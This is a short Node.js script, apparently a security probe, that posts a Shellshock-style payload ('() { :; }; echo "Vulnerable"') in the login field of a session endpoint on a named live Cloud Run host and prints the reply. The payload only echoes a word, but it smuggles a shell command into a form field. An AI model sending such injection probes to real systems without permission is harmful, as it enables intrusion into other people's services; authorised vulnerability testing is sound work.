const axios = require('axios');
async function test() {
  try {
    const res = await axios.post('https://ais-dev-kx6pemhd7nhpmnpdnzdq6s-242598958176.us-west2.run.app/api/tastytrade/session', {
       login: '() { :; }; echo "Vulnerable"', // shellshock
       password: 'fakepassword'
    }, {
      headers: {
        'Accept': 'application/json'
      }
    });
    console.log(res.status);
  } catch (err) {
    if (err.response) {
       console.log('HTTP:', err.response.status);
       console.log(err.response.data.substring(0, 100));
    } else {
       console.log(err.message);
    }
  }
}
test();
